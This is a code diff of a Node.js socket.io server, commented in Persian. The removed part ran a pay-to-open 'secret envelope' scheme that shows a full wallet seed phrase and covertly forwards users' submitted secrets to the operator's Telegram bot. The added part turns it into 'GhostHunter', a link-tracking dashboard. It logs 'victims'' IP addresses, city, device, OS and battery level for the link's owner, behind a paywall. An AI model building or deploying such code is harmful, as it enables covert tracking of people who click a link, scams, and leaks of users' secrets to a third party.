@@ -2,12 +2,6 @@ const express = require('express');
 const http = require('http');
 const { Server } = require("socket.io");
 const path = require('path');
-const https = require('https');
-
-// --- 🤖 دریافت رمز از گاوصندوق سرور (امنیت ۱۰۰٪) ---
-// این خطوط رمز رو از تنظیمات Railway میخونن
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 const app = express();
 const server = http.createServer(app);
@@ -15,68 +9,43 @@ const io = new Server(server);
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- ✉️ رازِ اول (کیف پول ۷ دلاری تو) ---
-let currentEnvelope = {
-    id: 8423,
-    location: "Dubai, UAE 🇦🇪",
-    device: "iPhone 15 Pro Max",
-    tag: "💰 Wallet Seed (Balance: $7.29)",
-    // چیزی که کاربر قبل از پرداخت (تار) می‌بینه (۱۱ کلمه)
-    preview: "1.extend 2.wave 3.increase 4.mother 5.connect 6.own 7.fiscal 8.lady 9.flat 10.mistake 11.leaf 12.????",
-    // چیزی که بعد از پرداخت می‌بینه (کلید کامل)
-    fullContent: "Real Trust Wallet (TRX/USDT)\nBalance: ~$7.29\n\nSeed Phase:\n1.extend\n2.wave\n3.increase\n4.mother\n5.connect\n6.own\n7.fiscal\n8.lady\n9.flat\n10.mistake\n11.leaf\n12.gather\n\nنوش جونت! حالا نوبت توئه یه چیزی بذاری...",
-    timestamp: Date.now()
-};
-
-// تابع ارسال به تلگرام
-function sendToTelegram(message) {
-    if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
-        console.log("Telegram secrets not set in Railway!");
-        return; 
-    }
-    const text = encodeURIComponent("🚨 NEW ACTIVITY:\n\n" + message);
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}`;
-    https.get(url).on('error', (e) => { console.error(e); });
-}
+// ذخیره موقت شکارها (در رم سرور)
+let captures = [];
 
 io.on('connection', (socket) => {
-    // ارسال اطلاعات بسته (تار)
-    socket.emit('envelope-data', {
-        id: currentEnvelope.id,
-        location: currentEnvelope.location,
-        device: currentEnvelope.device,
-        tag: currentEnvelope.tag,
-        preview: currentEnvelope.preview
+    
+    // وقتی کسی (صاحب لینک) وارد پنل میشه
+    socket.on('join-dashboard', () => {
+        // شکارهای قبلی رو بهش نشون بده
+        socket.emit('update-captures', captures);
     });
 
-    // درخواست باز کردن (وقتی دکمه پرداخت زده شد)
-    socket.on('open-envelope', () => {
-        // خبر دادن به تلگرام تو
-        sendToTelegram(`💰 PAYMENT CLAIMED! Someone opened message #${currentEnvelope.id}`);
-        // تحویل جایزه به کاربر
-        socket.emit('open-success', currentEnvelope.fullContent);
-    });
-
-    // ثبت پیام جدید توسط کاربر (برای نفر بعدی)
-    socket.on('submit-new-secret', (data) => {
-        // 1. ارسال متن کاربر به تلگرام تو (برای نظارت)
-        sendToTelegram(`📝 USER WROTE:\nTag: ${data.tag}\nContent: ${data.content}`);
-
-        // 2. آپدیت کردن پاکت برای نفر بعدی
-        currentEnvelope = {
-            id: currentEnvelope.id + 1,
-            location: "Unknown User (Online)",
-            device: "Mobile Device",
-            tag: data.tag,
-            preview: "Hidden Message...", 
-            fullContent: data.content,
-            timestamp: Date.now()
+    // وقتی یک قربانی روی لینک کلیک کرد و اطلاعاتش اومد
+    socket.on('victim-data', (data) => {
+        const victimInfo = {
+            id: Date.now(),
+            ip: data.ip,
+            city: data.city || 'Unknown',
+            device: data.device,
+            os: data.os,
+            battery: data.battery + '%',
+            time: new Date().toLocaleTimeString(),
+            isPaid: false // اولش اطلاعات دقیق قفله
         };
+        
+        captures.unshift(victimInfo); // اضافه به اول لیست
+        if (captures.length > 20) captures.pop(); // فقط ۲۰ تای آخر رو نگه دار
 
-        // رفرش کردن صفحه همه
-        io.emit('envelope-data', currentEnvelope);
+        // ارسال به داشبورد (صدای آژیر پخش میشه)
+        io.emit('new-capture', victimInfo);
+    });
+
+    // وقتی کسی پول داد و خواست اطلاعات رو باز کنه
+    socket.on('unlock-data', (id) => {
+        // اینجا باید منطق پرداخت باشه. فعلا برای دمو باز میکنیم
+        io.emit('data-unlocked', id);
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`GhostHunter running on port ${PORT}`));
